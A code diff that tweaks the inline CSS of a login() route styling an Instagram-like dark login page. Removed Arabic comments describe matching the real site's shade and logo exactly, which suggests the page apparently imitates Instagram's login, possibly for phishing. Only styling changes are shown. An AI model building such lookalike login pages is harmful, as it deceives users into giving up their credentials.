@@ -53,7 +53,6 @@ def login():
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         
-        /* تعديل الخلفية لتصبح مطابقة تماماً للدرجة الحقيقية (أفتح قليلاً من الأسود المطلق) */
         body { 
             background: #121212; 
             color: #f5f5f5;
@@ -68,7 +67,7 @@ def login():
         .main-container { 
             width: 100%; 
             max-width: 350px; 
-            padding: 20px; 
+            padding: 10px 20px 20px 20px; 
             display: flex; 
             flex-direction: column; 
             justify-content: center; 
@@ -79,16 +78,15 @@ def login():
         .lang-text {
             color: #a8a8a8;
             font-size: 12px;
-            margin-bottom: 25px;
+            margin-bottom: 15px;
         }
 
         .insta-icon-container {
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             display: flex;
             justify-content: center;
         }
         
-        /* تصغير حجم الشعار الملون ليطابق الشكل المطلوب تماماً */
         .insta-icon {
             width: 58px;
             height: 58px;
@@ -147,7 +145,7 @@ def login():
         }
         .submit-btn:hover { background: #1877f2; }
 
-        .forgot-pass { color: #f5f5f5; font-size: 13px; text-decoration: none; display: block; margin-top: 10px; font-weight: 400; }
+        .forgot-pass { color: #f5f5f5; font-size: 13px; text-decoration: none; display: block; margin-top: 5px; font-weight: 400; }
 
         .footer-section { 
             width: 100%; 
